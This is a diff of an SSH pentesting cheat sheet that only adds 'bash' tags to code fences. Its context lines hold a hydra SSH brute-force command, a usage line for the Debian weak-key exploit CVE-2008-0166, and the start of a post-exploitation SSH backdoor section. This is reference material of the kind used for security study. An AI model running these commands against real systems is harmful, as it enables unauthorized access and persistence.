@@ -86,13 +86,13 @@ https://shhgit.darkport.co.uk/
 
 ### Brute force <a href="#brute-force-1" id="brute-force-1"></a>
 
-```
+```bash
 hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> ssh://<IP> -u -vV
 ```
 
 ### CVE-2008-0166 <a href="#cve-2008-0166" id="cve-2008-0166"></a>
 
-```
+```bash
 All SSL and SSH keys generated on Debian-based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected.
 
 https://www.exploit-db.com/exploits/5720
@@ -109,7 +109,7 @@ python 5720 dsa/1024 <IP> <USER> <PORT> <THREADS>
 
 ### SSH backdoor - post exploitation <a href="#ssh-backdoor---post-exploitation" id="ssh-backdoor---post-exploitation"></a>
 
-```
+```bash
 # Attacker
 ssh-keygen -f <FILENAME>
 chmod 600 <FILENAME>
